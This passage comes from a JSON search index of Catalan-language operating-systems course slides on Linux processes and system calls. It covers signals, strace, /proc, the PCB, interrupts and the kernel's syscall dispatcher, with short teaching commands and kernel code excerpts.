    "text": "Exemples pràctics (II)\n\n\n\nObrirem 1 terminal i ens connectarem a debian per ssh.\nCrearem un procés en background: sleep 120 &\nObservarem com el procés sleep es troba en estat (S - Interruptible sleep).\nEnviarem un senyal per aturar el procés: kill -STOP {PID del procés sleep}\nObservarem com el procés sleep ha retornat a l’estat (T - stopped by job control signal).\nEnviarem un senyal per continuar l’execució del procés: kill -CONT {PID del procés sleep}\n\n\nman kill\nsleep 100 &\nps -o pid,state,command  \nkill -STOP {pid}\nps -o pid,state,command\nkill -CONT {pid}\nkill -KILL {pid}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#espiant-un-procés-amb-strace",
    "href": "slides/03-procs.html#espiant-un-procés-amb-strace",
    "title": "Processos a Linux",
    "section": "Espiant un procés amb strace",
    "text": "Espiant un procés amb strace\nEn una terminal executem un procés. Per exemple:\n  sleep 120 &\nEn un altra terminal executem la següent instrucció:\nstrace -f -p {pid}\n\nSi en l’output de la comanda observem que el procés està parat en crides a sistema del tipus read() el procés està esperant entrada de dades.\nEn altres casos, veurem quines són les crides a sistema que està realitzant el procés.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#pcb-process-control-block",
    "href": "slides/03-procs.html#pcb-process-control-block",
    "title": "Processos a Linux",
    "section": "PCB (Process Control Block)",
    "text": "PCB (Process Control Block)\n\n\nEl PCB és una estructura de dades que permet al sistema operatiu supervisar i control un procés.\n\nInformació guardada al PCB:\n\nPunters.\nEstat del procés.\nIdentificadors.\nTaula de fitxers oberts.\nRecursos assignats.\nContext dels registre de CPU.\nInformació sobre la mèmoria.\nInformació sobre la planificació.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#estructura-del-pcb-i",
    "href": "slides/03-procs.html#estructura-del-pcb-i",
    "title": "Processos a Linux",
    "section": "Estructura del PCB (I)",
    "text": "Estructura del PCB (I)\nEl PCB de Linux es defineix a struct task_struct al fitxer sched.h.\n\nvolatile long state: conté l’estat del procés. Que la variable estigui declarada com volatile li indica a l’compilador que el seu valor pot canviar-se de forma asíncrona (per exemple des d’una rutina de tractament d’interrupció).\nstruct thread_info * thread_infp: Conté informació de baix nivell sobre el procés: flags, estatus, cpu, domini d’execució, etc.\nunsigned long flags: conté l’estat detallat de l’procés dins el nucli. Representa el cicle de vida d’un procés. Cada bit indica un possible esdeveniment i no són mútuament exclusius.\nunsigned long ptrace: Informació sobre la monitorització un procés.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#estructura-del-pcb-ii",
    "href": "slides/03-procs.html#estructura-del-pcb-ii",
    "title": "Processos a Linux",
    "section": "Estructura del PCB (II)",
    "text": "Estructura del PCB (II)\n\nint exit_state, int exit_code, exit_signal: Contenen l’estat del procés a l’acabar, el valor de terminació d’un procés, en cas que hi hagi finalitzat mitjançant la crida a sistema exit (2) o, si acaba per un senyal, contindrà el identificador de senyal que el va matar.\npid_t pid: Conté l’identificador de l’procés.\npid_t tpid: Conté l’identificador del grup de processos. Coincideix amb l’identificador de el lider de el grup.\nuid_t uid, euid, suid, fsuid: Usuari propietari d’aquest procés, tant real (uid), com efectiu (euid), i atributs més específics.\ngid_t gid, Egid, sgid, fsgid: Grup propietari d’aquest procés, tant real (gid), com efectiu (Egid), i atributs més específics.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#intercanvi-de-processos-i",
    "href": "slides/03-procs.html#intercanvi-de-processos-i",
    "title": "Processos a Linux",
    "section": "Intercanvi de processos (I)",
    "text": "Intercanvi de processos (I)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#intercanvi-de-processos-ii",
    "href": "slides/03-procs.html#intercanvi-de-processos-ii",
    "title": "Processos a Linux",
    "section": "Intercanvi de processos (II)",
    "text": "Intercanvi de processos (II)\nEl kernel gestiona una estructura de taula (diccionari) semblant a la representada en la imatge següent per poder accedir de forma eficient als diferents PCBs. Aquesta estrcutura de dades es coneix com a Taula PCB.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#proc",
    "href": "slides/03-procs.html#proc",
    "title": "Processos a Linux",
    "section": "/proc",
    "text": "/proc\n\n\n\ncmdline: Conté l’ordre que comença el procés, amb tots els seus paràmetres.\ncwd: Enlace simbòlic al directori de treball actual (directori de treball actual) del procés.\nenviron: Conté totes les variables d’entorn per al procés.\nfd: Conté els descriptors d’arxiu per al procés, mostrant els fitxers o dispositius que estan utilitzant.\nmaps, statm i mem: Conté informació relacionada amb la memòria en ús pel procés.\nstat and status: Conté nformació sobre l’estat del procés.\n\n\n\n\nPer trobar la taula de processos necessitem observar la següent ruta: /proc:\nsleep 60 &\nless /proc/{pid}/stat\nless /proc/{pid}/environ",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/03-procs.html#això-és-tot-per-avui",
    "href": "slides/03-procs.html#això-és-tot-per-avui",
    "title": "Processos a Linux",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nTAKE HOME MESSAGE\nLa gestió de processos a Unix/Linux és crucial per a una utilització eficient del sistema i una correcta assignació de recursos. El directori /proc ofereix accés als PCBs que contenen informació sobre cada procés en execució.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 · Processos"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#que-són-les-crides-a-sistema",
    "href": "slides/02-syscalls.html#que-són-les-crides-a-sistema",
    "title": "Crides a sistema",
    "section": "Que són les crides a sistema?",
    "text": "Que són les crides a sistema?\nLes crides a sistema són interfícies que permeten a un programa en mode usuari sol·licitar serveis al nucli del sistema operatiu de manera segura i controlada.\n\n\n\n\n\n\n\n\nSistema operatiu\nNº aproximat de syscalls\nNotes\n\n\n\n\nLinux x86_64\n~300\nVariació segons kernel\n\n\nFreeBSD\n~500\nInclou syscalls BSD històrics\n\n\nWindows NT\n~2000\nCrides natives Nt*; moltes encapsulades en DLL\n\n\n\nNormalment s’accedeix a les syscalls a través de llibreries de sistema, que encapsulen i abstrauen les crides:\n\nUnix/Linux: libc (stdio.h, stdlib.h, sys/types.h, sys/shm.h, …)\nWindows: API de Windows (kernel32.dll, ntdll.dll, …)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#principals-crides-a-sistema-i",
    "href": "slides/02-syscalls.html#principals-crides-a-sistema-i",
    "title": "Crides a sistema",
    "section": "Principals crides a sistema? (I)",
    "text": "Principals crides a sistema? (I)\n\n\n\n\n\n\n\n\n\nCategoria\nWindows (API / Syscall)\nUnix/Linux (Syscall)\nDescripció\n\n\n\n\nControl de processos\nCreateProcess() / NtCreateProcess\nfork() / clone()\nfork() crea un procés fill; Windows encapsula la syscall amb CreateProcess.\n\n\n\nExitProcess() / NtTerminateProcess\nexit()\nTanca el procés.\n\n\n\nWaitForSingleObject() / NtWaitForSingleObject\nwait() / waitpid()\nSincronització de processos.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#principals-crides-a-sistema-ii",
    "href": "slides/02-syscalls.html#principals-crides-a-sistema-ii",
    "title": "Crides a sistema",
    "section": "Principals crides a sistema? (II)",
    "text": "Principals crides a sistema? (II)\n\n\n\n\n\n\n\n\n\nCategoria\nWindows (API / Syscall)\nUnix/Linux (Syscall)\nDescripció\n\n\n\n\nInformació i temporització\nGetCurrentProcessId() / NtQueryInformationProcess\ngetpid()\nRetorna PID.\n\n\n\nSetTimer() / NtSetTimer\nalarm() / nanosleep()\nTemporització i delays.\n\n\n\nSleep() / NtDelayExecution\nsleep() / nanosleep()\nPausa el procés; variants més precises disponibles.\n\n\nComunicació entre processos (IPC)\nCreatePipe() / NtCreateNamedPipeFile\npipe()\nPipes anònims; Windows també té Named Pipes, mailslots, shared memory.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#principals-crides-a-sistema",
    "href": "slides/02-syscalls.html#principals-crides-a-sistema",
    "title": "Crides a sistema",
    "section": "Principals crides a sistema?",
    "text": "Principals crides a sistema?\n\n\n\n\n\n\n\n\n\nCategoria\nWindows (API / Syscall)\nUnix/Linux (Syscall)\nDescripció\n\n\n\n\nProtecció i permisos\nSetFileSecurity() / NtSetSecurityObject\nchmod(), chown()\nWindows usa ACLs complexes; Unix usa permisos Unix tradicionals.\n\n\nManipulació de fitxers\nCreateFile() / NtCreateFile\nopen()\nObre un fitxer.\n\n\n\nReadFile() / NtReadFile\nread()\nLlegeix dades.\n\n\n\nWriteFile() / NtWriteFile\nwrite()\nEscriu dades.\n\n\n\nCloseHandle() / NtClose\nclose()\nTanca descriptor o handle.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exemple-amb-la-llibreria-stdio.h",
    "href": "slides/02-syscalls.html#exemple-amb-la-llibreria-stdio.h",
    "title": "Crides a sistema",
    "section": "Exemple amb la llibreria (stdio.h)",
    "text": "Exemple amb la llibreria (stdio.h)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#protecció-de-la-cpu",
    "href": "slides/02-syscalls.html#protecció-de-la-cpu",
    "title": "Crides a sistema",
    "section": "Protecció de la CPU",
    "text": "Protecció de la CPU\n\n\n\nLa CPU permet múltiples nivells de seguretat, anomenats rings (o anells).\nCada ring (començant pel ring 0) restringeix l’accés a certes instruccions.\nEl kernel utilitza el ring 0 (anell de fes el que vulguis) com a Kernel Space i el ring 3 (l’anell on tens més limitacions) com a UserSpace (on s’executen els teus programes).\n\n\n\n\n\nDegut a l’accés restringit a la memòria i als ports d’E/S en el Ring 3, l’espai d’usuari no pot fer gairebé res per al món exterior sense cridar al kernel. No pot obrir fitxers, enviar paquets de xarxa, imprimir a la pantalla o assignar memòria.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#què-és-una-crida-al-sistema-ii",
    "href": "slides/02-syscalls.html#què-és-una-crida-al-sistema-ii",
    "title": "Crides a sistema",
    "section": "Què és una crida al sistema? (II)",
    "text": "Què és una crida al sistema? (II)\n\nEls programes en mode usuari necessiten accedir a recursos gestionats pel kernel (fitxers, dispositius, memòria, etc.).\nEl kernel s’executa en mode privilegiat (anell 0) amb accés complet al maquinari.\nEls programes en mode usuari s’executen en mode restringit (anell 3) amb accés limitat.\nLes crides al sistema són la interfície que permet als programes en mode usuari sol·licitar serveis al kernel de manera segura.\nNo tenim cap instrucció que permeti canviar directament del mode usuari al mode kernel.\n\n\nCom pot un procés en mode usuari notificar al kernel que necessita fer alguna cosa? Si no tenim cap instrucció que ho permeti?",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#com-funciona-el-procesador",
    "href": "slides/02-syscalls.html#com-funciona-el-procesador",
    "title": "Crides a sistema",
    "section": "Com funciona el procesador?",
    "text": "Com funciona el procesador?\nEl processador executa instruccions seguint el cicle:\n\nHow Do CPUs Run Programs Using the Fetch, Decode, Execute Cycle?  Fetch → Decode → Execute → Memory → Writeback.\n\nPot processar múltiples instruccions en paral·lel gràcies a pipelining i execució fora d’ordre.\n\nEl codi usuari no pot accedir directament a dispositius o memòria reservada.\nEls dispositius envien interrupcions per indicar esdeveniments (ex.: teclat, disc, xarxa).\nEl kernel intercepta aquestes interrupcions i pot invocar handlers, que poden traduir-se en crides a sistema per als processos usuari.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#què-és-una-interrupció",
    "href": "slides/02-syscalls.html#què-és-una-interrupció",
    "title": "Crides a sistema",
    "section": "Què és una interrupció?",
    "text": "Què és una interrupció?\nLes interrupcions són senyals asíncrons enviats al processador per indicar esdeveniments que requereixen atenció immediata. Poden ser de hardware (teclat, disc, temporitzador) o de software (excepcions, traps, syscalls).\n\nGestió d’una interrupció\n\nGuardar el context del procés actual (registres, PC, flags).\nCanviar a mode kernel.\nDeterminar la causa de la interrupció (vector d’interrupcions).\nSaltar a la Interrupt Service Routine (RTI/ISR).\nExecutar ISR per atendre l’esdeveniment.\n6.Restaurar el context del procés.\nTornar a mode usuari.\n\n\n\nLes interrupcions són prioritàries i poden executar-se sobre processos en execució per garantir resposta immediata.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#què-és-la-taula-dinterrupcions",
    "href": "slides/02-syscalls.html#què-és-la-taula-dinterrupcions",
    "title": "Crides a sistema",
    "section": "Què és la taula d’interrupcions?",
    "text": "Què és la taula d’interrupcions?\n\nQuan el processador rep una interrupció, ha de saber a quin codi saltar per atendre-la.\nLa Interrupt Descriptor Table (IDT) és una estructura del kernel que indica al CPU la adreça de cada ISR.\nSense configurar la IDT, el CPU no sabria quin codi executar en rebre una interrupció.\n\n\nQui configura la IDT?\n\nEl kernel, a l’inici, inicialitza la IDT i apunta cada entrada a la seva ISR corresponent.\nEl kernel també gestiona les actualitzacions de la IDT en temps d’execució, si és necessari.\n\n\n\nLa IDT es pot veure directament al codi font del kernel Linux: IDT i on s’inicialitza: IDT init.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#excepcions",
    "href": "slides/02-syscalls.html#excepcions",
    "title": "Crides a sistema",
    "section": "Excepcions",
    "text": "Excepcions\nLes excepcions són esdeveniments generats pel CPU quan una instrucció provoca una condició anormal. El sistema operatiu pot tractar l’excepció; si no pot, envia un senyal al procés, que pot usar el gestor per defecte o un gestor específic.\n\n\n\n\n\n\n\n\n\nTipus\nQuan s’informa\nExemple\nDescripció\n\n\n\n\nFault\nAbans de l’execució\nPage fault\nNormalment es pot corregir; instrucció reintenta després del tractament.\n\n\nTrap\nDesprés de l’execució\nBreakpoint, syscall\nCondició detectada després; sovint informativa o de depuració.\n\n\nAbort\nIrrecuperable\nParitat de memòria, kernel panic\nNo es pot continuar; sovint provoca terminació del procés o panic del kernel.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exemples-dexcepcions",
    "href": "slides/02-syscalls.html#exemples-dexcepcions",
    "title": "Crides a sistema",
    "section": "Exemples d’excepcions",
    "text": "Exemples d’excepcions\n\n\n\n\n\n\n\n\nName\nType\nDescripció curta\n\n\n\n\nDivide-by-zero\nFault\nInstrucció divideix per zero\n\n\nDebug\nTrap\nDepuració; després de la instrucció\n\n\nNon-maskable Interrupt\nInterrupt\nInterrupció crítica de hardware\n\n\nBreakpoint\nTrap\nTrap de depuració per breakpoint\n\n\nOverflow\nTrap\nL’operació aritmètica sobrepassa capacitat del registre\n\n\nBound Range Exceeded\nFault\nIndex fora de rang en instrucció BOUND\n\n\nDouble Fault\nAbort\nError crític del CPU durant gestió d’una altra excepció\n\n\nPage Fault\nFault\nAccés a pàgina no resident en memòria\n\n\n\n\nExcepcions\n\n\nPer a més informació podeu consultar el següent enllaç: Excepcions.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#com-accedim-al-kernel",
    "href": "slides/02-syscalls.html#com-accedim-al-kernel",
    "title": "Crides a sistema",
    "section": "Com accedim al Kernel",
    "text": "Com accedim al Kernel\n\n\n\n\nUn trap és una interrupció de software generada deliberadament pel procés usuari per sol·licitar un servei del kernel. La majoria de syscalls s’implementen com traps, que canvien a mode kernel i executen la funció corresponent.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#readfd-buffer-nbytes",
    "href": "slides/02-syscalls.html#readfd-buffer-nbytes",
    "title": "Crides a sistema",
    "section": "read(fd, buffer, nbytes)",
    "text": "read(fd, buffer, nbytes)\nEspai d’usuari\n\nPrograma C:\n\nPosa fd, buffer, nbytes als registres(RDI,RSI,RDX).\nCrida a read().\n\nLlibreria de sistema:\n\nPosa el codi de read a RAX.\nExecuta syscall (TRAP a mode kernel).\n\n\n\nTransició a mode kernel",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#readfd-buffer-nbytes-1",
    "href": "slides/02-syscalls.html#readfd-buffer-nbytes-1",
    "title": "Crides a sistema",
    "section": "read(fd, buffer, nbytes)",
    "text": "read(fd, buffer, nbytes)\n\nCPU canvia a mode supervisor i salta a la rutina del kernel indicada a la IDT.\n\n\nEspai del kernel\n\nValidació de descriptors i permisos.\nLocalitza rutina de tractament de read a la taula de syscall.\nExecuta la rutina:\n\nLlegeix dades del dispositiu d’E/S.\nCopia dades al buffer d’usuari (copy_to_user).\nRetorna resultat (nombre de bytes llegits o -1).",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#readfd-buffer-nbytes-2",
    "href": "slides/02-syscalls.html#readfd-buffer-nbytes-2",
    "title": "Crides a sistema",
    "section": "read(fd, buffer, nbytes)",
    "text": "read(fd, buffer, nbytes)\n\nTransició a mode usuari\n\n\nCPU restaura context del procés i retorna al programa.\n\n\nEspai d’usuari\n\nLlibreria de sistema: Retorna el resultat de la crida a read() al Programa C.\nPrograma: Continua l’execució utilitzant les dades llegides. O bé, tracta l’error si n’hi ha (errno)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#resum-amb-open",
    "href": "slides/02-syscalls.html#resum-amb-open",
    "title": "Crides a sistema",
    "section": "Resum amb open()",
    "text": "Resum amb open()\n\n\n\n# Executem a user space\nmov edx,4       ; message length\nmov ecx,msg     ; message to write\nmov ebx,1       ; file descriptor (stdout)\nmov eax,4       ; system call number (sys_write)\nint 0x80        ; interrupt! Number 128 (0x80 in hex);",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#setup-de-les-crides-a-sistema-x86",
    "href": "slides/02-syscalls.html#setup-de-les-crides-a-sistema-x86",
    "title": "Crides a sistema",
    "section": "Setup de les crides a sistema (x86)",
    "text": "Setup de les crides a sistema (x86)\n\nLes syscalls estan identificades per números únics (syscall numbers).\nArguments màxims: 6 registres, depenent de l’arquitectura.\nValor de retorn: en el registre principal (EAX/RAX).\n\n\n\n\n\n\n\n\n\n\n\nArquitectura\nRegistre syscall number\nArguments (1..6)\nRetorn\n\n\n\n\nx86 32-bit\nEAX\nEBX, ECX, EDX, ESI, EDI, EBP\nEAX\n\n\nx86 64-bit\nRAX\nRDI, RSI, RDX, R10, R8, R9\nRAX\n\n\n\n\n\nPrograma usuari escriu arguments als registres corresponents.\nExecuta instrucció int $0x80 (32-bit) o syscall (64-bit) → trap al kernel.\nKernel llegeix registre syscall number, localitza la rutina a la syscall table, executa i retorna resultat en EAX/RAX.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#linux-syscall-dispatcher-i",
    "href": "slides/02-syscalls.html#linux-syscall-dispatcher-i",
    "title": "Crides a sistema",
    "section": "Linux Syscall Dispatcher (I)",
    "text": "Linux Syscall Dispatcher (I)\n__visible noinstr bool do_syscall_64(struct pt_regs *regs, int nr)\n{\n    nr = syscall_enter_from_user_mode(regs, nr); \n    if (!do_syscall_x64(regs, nr) && !do_syscall_x32(regs, nr) && nr != -1) {\n        regs-&gt;ax = __x64_sys_ni_syscall(regs);\n    }\n    syscall_exit_to_user_mode(regs);\n    return true;\n}\n\nsyscall_enter_from_user_mode(regs, nr)\n\nCanvia a mode kernel.\nRealitza validacions de seguretat i prepara els registres (RAX, RDI, RSI, etc.).\n\ndo_syscall_x64 / do_syscall_x32\n\nInvoca la rutina correcta de la syscall table segons arquitectura.\n\nsyscall_exit_to_user_mode(regs)\n\nPrepara els registres per tornar a mode usuari.\n\n\n\nsyscall_64.c",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#linux-syscall-dispatcher-ii",
    "href": "slides/02-syscalls.html#linux-syscall-dispatcher-ii",
    "title": "Crides a sistema",
    "section": "Linux Syscall Dispatcher (II)",
    "text": "Linux Syscall Dispatcher (II)\nstatic __always_inline bool do_syscall_x64(struct pt_regs *regs, int nr)\n{\n    unsigned int unr = nr;\n    if (likely(unr &lt; NR_syscalls)) {\n        unr = array_index_nospec(unr, NR_syscalls);\n        regs-&gt;ax = x64_sys_call(regs, unr);\n        return true;\n    }\n    return false;\n}\n\nNR_syscalls: nombre total de syscalls suportades.\narray_index_nospec: prevenció d’atacs de canal lateral al indexar la taula de syscalls.\nx64_sys_call(regs, unr): crida la funció de syscall corresponent.\nRetorna true si la syscall és vàlida i s’ha executat, false en cas contrari.\n\n\nx64_syscall.c",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#punters-i-seguretat-i",
    "href": "slides/02-syscalls.html#punters-i-seguretat-i",
    "title": "Crides a sistema",
    "section": "Punters i seguretat (I)",
    "text": "Punters i seguretat (I)\n\nTots els punters que provenen de l’usuari han de ser validads abans de ser utilitzats pel kernel.\n\n\n\n\n\n\n\n\nTipus de punter\nConseqüència / tractament\n\n\n\n\nPunter a kernel space des d’usuari\nCorrupció de dades del kernel → bug crític.\n\n\nPunter invàlid a user space\nPage fault; el kernel gestiona l’error.\n\n\nPunter invàlid dins del kernel\nBug del kernel; pot provocar panic.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#punters-i-seguretat-ii",
    "href": "slides/02-syscalls.html#punters-i-seguretat-ii",
    "title": "Crides a sistema",
    "section": "Punters i seguretat (II)",
    "text": "Punters i seguretat (II)\n\nFuncions com __chk_user_ptr(ptr) comproven si el punter apunta a espai usuari vàlid.\nSi es fa servir un punter invàlid, la MMU genera un page fault que el kernel pot gestionar.\nTaula d’excepcions: el kernel registra quines instruccions poden accedir a l’espai usuari.\nPermet diferenciar faults legítims de punters invàlids o errors del kernel.\n__get_user() i __put_user() són funcions que permeten llegir i escriure dades a l’espai d’usuari de manera segura.\n__copy_to_user() i __copy_from_user() són funcions que permeten copiar dades entre l’espai d’usuari i el kernel de manera segura.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#accés-a-dades-dusuari",
    "href": "slides/02-syscalls.html#accés-a-dades-dusuari",
    "title": "Crides a sistema",
    "section": "Accés a dades d’usuari",
    "text": "Accés a dades d’usuari\n#define get_user(x, ptr)                    \n({                              \n    const void __user *__p = (ptr);             \n    might_fault();                      \n    access_ok(__p, sizeof(*ptr)) ?      \n        __get_user((x), (__typeof__(*(ptr)) __user *)__p) :\n        ((x) = (__typeof__(*(ptr)))0,-EFAULT);      \n})\n\n__chk_user_ptr(ptr): Valida que ptr apunta a espai usuari vàlid abans d’accedir-hi.\nmight_fault(): Marca que el codi següent pot generar un page fault.\naccess_ok(__p, sizeof(*ptr)): Comprova que l’àrea de memòria és accessible.\n__get_user((x), (__typeof__(*(ptr)) __user *)__p): Llegeix el valor de l’adreça d’usuari i el guarda a x.\nSi l’accés no és vàlid, assigna 0 a x i retorna -EFAULT.\n\n\nProtegeix el kernel de punters maliciosos o invàlids. Pots veure més a get_user.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#virtual-dynamic-shared-object-vdso",
    "href": "slides/02-syscalls.html#virtual-dynamic-shared-object-vdso",
    "title": "Crides a sistema",
    "section": "Virtual Dynamic Shared Object (VDSO)",
    "text": "Virtual Dynamic Shared Object (VDSO)\nÀrea especial de memòria mapejada a l’espai usuari amb codi generat pel kernel per executar certes funcions de sistema de manera més ràpida.\n\nObjectiu\nEvitar la transició completa a mode kernel, reduint latència i cost de syscalls repetitives.\n\n\n\n\n\n\n\n\nExemples\n\n\n\ngettimeofday()\ntime()\ngetpid()\n\n\n\n\n\n\nAlgunes dades dinàmiques es troben en una regió de memòria RW dins del VDSO.\nLa funció accedeix directament a aquestes dades sense fer una syscall completa.\nSi és necessari, el kernel actualitza aquestes dades de forma transparent.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#com-funciona-la-dualitat",
    "href": "slides/02-syscalls.html#com-funciona-la-dualitat",
    "title": "Crides a sistema",
    "section": "Com funciona la dualitat?",
    "text": "Com funciona la dualitat?",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#canvi-de-context-i",
    "href": "slides/02-syscalls.html#canvi-de-context-i",
    "title": "Crides a sistema",
    "section": "Canvi de context (I)",
    "text": "Canvi de context (I)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#canvi-de-context-ii",
    "href": "slides/02-syscalls.html#canvi-de-context-ii",
    "title": "Crides a sistema",
    "section": "Canvi de context (II)",
    "text": "Canvi de context (II)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#característiques-de-la-dualitat",
    "href": "slides/02-syscalls.html#característiques-de-la-dualitat",
    "title": "Crides a sistema",
    "section": "Característiques de la dualitat",
    "text": "Característiques de la dualitat\n\nTot el codi del nucli s’executa amb tots els privilegis.\nPermet accés complet a instruccions privilegiades i dispositius.\nEl sistema operatiu limita el temps i el codi executat en mode supervisor per reduir riscos i latència.\nPer accedir a serveis del nucli (syscalls, traps) cal un canvi de context:\n\nDes del mode usuari → mode kernel → execució → retorn.\n\nMecanisme controlat per accedir a rutines del kernel sense comprometre seguretat.\nAccions potencialment insegures (accés a taules de pàgines, E/S, control del CPU) prohibit en mode usuari.\nEl kernel evita que processos accedeixin fora de la seva regió assignada.\nTransforma adreces lògiques (abstractes) en físiques de forma segura.\nInterrupcions periòdiques i control del temporitzador\nEl kernel pot interrompre processos usuari en qualsevol moment.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exemples-dinstruccions-privilegiades",
    "href": "slides/02-syscalls.html#exemples-dinstruccions-privilegiades",
    "title": "Crides a sistema",
    "section": "Exemples d’instruccions privilegiades",
    "text": "Exemples d’instruccions privilegiades\n\nAssignació d’adreces de memòria.\nEsborreu o invalideu la memòria cau de dades.\nInvalideu les entrades a les taules de pàgines.\nCarregueu i llegiu els registres del sistema.\nCanvieu els modes de processador del nucli a l’usuari.\nCanvieu el voltatge i la freqüència del processador.\nParar un processador.\nRestableix un processador.\nFer operacions d’E/S.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#conclusió",
    "href": "slides/02-syscalls.html#conclusió",
    "title": "Crides a sistema",
    "section": "Conclusió",
    "text": "Conclusió\n\nLa CPU executa instruccions de manera lineal, una darrere l’altra.\nPer interactuar amb el món, depèn de les interrupcions.\nLa CPU té diferents nivells de privilegi, anomenats rings, que ajuden el sistema operatiu a aplicar la seguretat i el control.\nEls nostres programes normalment s’executen en l’anell menys privilegiat (mode usuari), cosa que significa que no podem executar directament certes instruccions.\nEns comuniquem amb el nucli a través de crides al sistema (syscalls), que són essencialment un tipus d’interrupció.\nEl nucli també configura interrupcions pel seu compte per gestionar els processos (com pausar-ne un, canviar a un altre o gestionar diversos esdeveniments del sistema). Podeu ampliar aquí",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#exercicis-proposats",
    "href": "slides/02-syscalls.html#exercicis-proposats",
    "title": "Crides a sistema",
    "section": "Exercicis proposats",
    "text": "Exercicis proposats\n\nLaboratori 07: Espiant el Kernel\nLaboratori 08: Crides a sistema personalitzades\nActivitat: Kernel Linux",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
    "objectID": "slides/02-syscalls.html#això-és-tot-per-avui",
    "href": "slides/02-syscalls.html#això-és-tot-per-avui",
    "title": "Crides a sistema",
    "section": "Això és tot per avui",
    "text": "Això és tot per avui\n\n\nTAKE HOME MESSAGE\n\nLes crides a sistema (syscalls) són la porta perquè els processos d’usuari accedeixin a serveis del kernel.\nEl dispatcher de Linux (do_syscall_64) gestiona syscalls, identifica el número, valida arguments i crida la rutina corresponent.\nExcepcions i interrupcions: són l´únic mecanisme perquè els processos d’usuari accedeixin al kernel.\nFlux: Usuari → Trap/syscall → Dispatcher → Rutina → Kernel → Retorn → Usuari.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Crides a sistema"
    ]
  },
  {
